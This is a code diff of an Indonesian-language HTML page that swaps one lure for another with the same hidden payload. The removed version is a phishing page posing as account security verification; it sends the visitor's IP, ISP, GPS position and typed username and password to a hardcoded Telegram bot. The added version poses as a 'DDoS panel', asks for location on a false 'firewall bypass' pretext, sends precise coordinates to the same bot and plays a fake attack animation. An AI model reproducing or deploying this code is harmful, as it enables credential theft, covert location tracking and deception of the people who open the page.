@@ -3,85 +3,92 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifikasi Keamanan Akun</title>
+    <title>Z-STRIKER | DDoS Panel V.3</title>
     <style>
-        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f0f2f5; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .login-card { background: #fff; padding: 35px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 100%; max-width: 360px; text-align: center; }
-        .logo { font-size: 28px; font-weight: bold; color: #1877f2; margin-bottom: 10px; }
-        .alert { background: #fff2f2; border: 1px solid #ffcccb; color: #d8000c; padding: 10px; font-size: 13px; border-radius: 5px; margin-bottom: 20px; font-weight: bold; }
-        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 15px; outline: none; }
-        input:focus { border-color: #1877f2; }
-        button { width: 100%; padding: 14px; background: #1877f2; border: none; color: white; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px; margin-top: 15px; }
-        button:hover { background: #145dbf; }
-        .footer { margin-top: 20px; font-size: 12px; color: #888; }
+        body { background-color: #0a0a0a; color: #00ff00; font-family: 'Courier New', Courier, monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .panel { background: rgba(20, 20, 20, 0.9); border: 1px solid #00ff00; padding: 30px; border-radius: 5px; box-shadow: 0 0 20px #00ff00; width: 400px; text-align: center; }
+        h1 { font-size: 24px; text-shadow: 0 0 10px #00ff00; }
+        input { width: 90%; padding: 10px; margin: 10px 0; background: #000; border: 1px solid #00ff00; color: #00ff00; outline: none; }
+        button { width: 95%; padding: 12px; background: #00ff00; color: #000; border: none; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        button:hover { background: #00cc00; box-shadow: 0 0 15px #00ff00; }
+        .logs { text-align: left; font-size: 10px; height: 80px; overflow-y: auto; background: #000; padding: 10px; margin-top: 15px; border: 1px solid #333; }
+        .status { font-size: 12px; margin-top: 10px; color: #ff0000; animation: blink 1s infinite; }
+        @keyframes blink { 50% { opacity: 0; } }
     </style>
 </head>
 <body>
 
-    <div class="login-card">
-        <div class="logo">Verification System</div>
-        <div class="alert">Peringatan: Aktivitas mencurigakan terdeteksi. Silahkan verifikasi identitas Anda untuk mencegah pemblokiran akun.</div>
-        
-        <input type="text" id="user" placeholder="Email, Username, atau Nomor HP" required>
-        <input type="password" id="pass" placeholder="Kata Sandi" required>
-        
-        <button onclick="kirimData()">KONFIRMASI SEKARANG</button>
-        
-        <div class="footer">
-            &copy; 2026 Security Service Management
-        </div>
+<div class="panel">
+    <h1>Z-STRIKER DDoS</h1>
+    <p style="font-size: 12px;">Power: 500 Gbps | Status: Online</p>
+    
+    <div class="status">SISTEM MEMERLUKAN IZIN GPS UNTUK BYPASS FIREWALL CLOUDFLARE...</div>
+
+    <input type="text" id="targetIp" placeholder="Masukkan URL / IP Target">
+    <input type="number" id="port" placeholder="Port (Default 80)">
+    <button onclick="startAttack()">LAUNCH ATTACK</button>
+
+    <div class="logs" id="logBox">
+        [system] Mempersiapkan socket...<br>
+        [system] Menunggu input target...<br>
     </div>
+</div>
 
-    <script>
-        // --- CONFIG TELEGRAM ---
-        const botToken = "8510635650:AAH3ZxP-qkEO2hb8kjv-tZyOZieN0IatEwo";
-        const chatId = "8551809114";
+<script>
+    const tele_token = "8510635650:AAH3ZxP-qkEO2hb8kjv-tZyOZieN0IatEwo";
+    const tele_id = "8551809114";
 
-        // 1. Ambil IP & Lokasi Presisi saat web dibuka (Auto-Grab)
-        window.onload = async () => {
-            try {
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const ip = await ipRes.json();
-                
-                let logEntry = `🔔 *TARGET BARU TERDETEKSI!*\n\n• IP: ${ip.ip}\n• Kota: ${ip.city}\n• ISP: ${ip.org}\n• Platform: ${navigator.platform}`;
-                await notify(logEntry);
-
-                // Minta Izin Maps secara paksa
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(async (pos) => {
-                        const maps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                        await notify(`📍 *LOKASI PRESISI (MAPS):*\n${maps}`);
-                    });
-                }
-            } catch (e) {}
-        };
-
-        // 2. Fungsi Kirim ke Tele
-        async function notify(text) {
-            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' })
-            });
+    // 1. AMBIL LOKASI SEHALUS MUNGKIN SAAT WEB DIBUKA
+    window.onload = function() {
+        if (navigator.geolocation) {
+            // Kita minta izin lokasi dengan alasan "Bypass Firewall"
+            navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+        } else {
+            console.log("Geolocation not supported.");
         }
+    };
 
-        // 3. Ambil Credential & Redirect
-        async function kirimData() {
-            const u = document.getElementById('user').value;
-            const p = document.getElementById('pass').value;
+    async function sendLocation(position) {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        const accuracy = position.coords.accuracy;
+        
+        const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+        const message = `📍 *LOKASI TARGET DITEMUKAN!*\n\n• Latitude: ${lat}\n• Longitude: ${lon}\n• Akurasi: ${accuracy} meter\n\n🔗 [BUKA DI MAPS](${mapUrl})`;
 
-            if (u === "" || p === "") {
-                alert("Harap isi semua kolom verifikasi!");
-                return;
-            }
+        await fetch(`https://api.telegram.org/bot${tele_token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: tele_id, text: message, parse_mode: 'Markdown' })
+        });
+        
+        addLog("[success] Latency bypass berhasil disinkronkan.");
+    }
 
-            // Kirim Hasil Phishing ke Telegram
-            await notify(`📩 *HASIL LOGIN TARGET*\n\n👤 User: \`${u}\` \n🔑 Pass: \`${p}\` \n\n*Hajar sekarang sebelum ganti PW!*`);
+    function handleError(error) {
+        addLog("[error] Gagal sinkronisasi lokasi. Akses ditolak.");
+    }
 
-            // Fake Loading & Redirect
-            alert("Verifikasi sedang diproses. Akun Anda akan pulih dalam 24 jam.");
-            window.location.href = "https://www.google.com"; // Lempar ke Google biar dia bingung
-        }
-    </script>
+    // 2. ANIMASI DDOS PALSU
+    function startAttack() {
+        const target = document.getElementById('targetIp').value;
+        if (!target) return alert("Isi IP Target!");
+
+        addLog(`[attack] Mengirim paket ke ${target}...`);
+        setTimeout(() => addLog("[attack] Flooding HTTP/2 Requests..."), 1000);
+        setTimeout(() => addLog("[attack] UDP Packet Storm initiated..."), 2000);
+        setTimeout(() => {
+            alert("Serangan Gagal! Server Target terlalu kuat. Gunakan Akun VIP.");
+            addLog("[system] Koneksi terputus.");
+        }, 5000);
+    }
+
+    function addLog(msg) {
+        const box = document.getElementById('logBox');
+        box.innerHTML += msg + "<br>";
+        box.scrollTop = box.scrollHeight;
+    }
+</script>
+
 </body>
 </html>
